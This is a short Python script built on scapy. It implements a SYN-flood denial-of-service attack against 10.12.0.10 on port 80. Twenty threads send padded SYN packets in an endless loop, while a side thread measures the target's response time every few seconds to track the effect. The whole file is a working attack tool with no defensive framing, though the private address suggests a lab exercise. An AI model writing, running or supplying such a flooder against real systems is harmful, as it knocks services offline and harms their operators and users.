from scapy.all import *
class FloodingAttack:
    def __init__(self, target_ip, target_port, packet_size=1024):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size

    def send_syn(self):
        ip = IP(dst=self.target_ip)
        tcp = TCP(sport=RandShort(), dport=self.target_port, flags="S")
        raw = Raw(b"X" * self.packet_size)
        packet = ip / tcp / raw
        send(packet, loop=1, verbose=0)
        
    def calc_rtt(self):
        ip = IP(dst=self.target_ip)
        tcp = TCP(sport=RandShort(), dport=self.target_port, flags="S")

        start_time = time.time()
        response = sr1(ip / tcp, verbose=0, timeout=3)
        end_time = time.time()
        if response:
            rtt = end_time - start_time
            print(f"RTT: {rtt} seconds")
        else:
            print("No response received.")
        
    def run_calc_rtt_every_5_sec(self):
        def run_every_5_sec():
            while True:
                self.calc_rtt()
                time.sleep(3)

        thread = threading.Thread(target=run_every_5_sec)
        thread.start()

if __name__ == "__main__":
    floodingAttack = FloodingAttack("10.12.0.10", 80)
    floodingAttack.run_calc_rtt_every_5_sec()
    for i in range(20):
        thread = threading.Thread(target=floodingAttack.send_syn)
        thread.start()
    floodingAttack.send_syn()
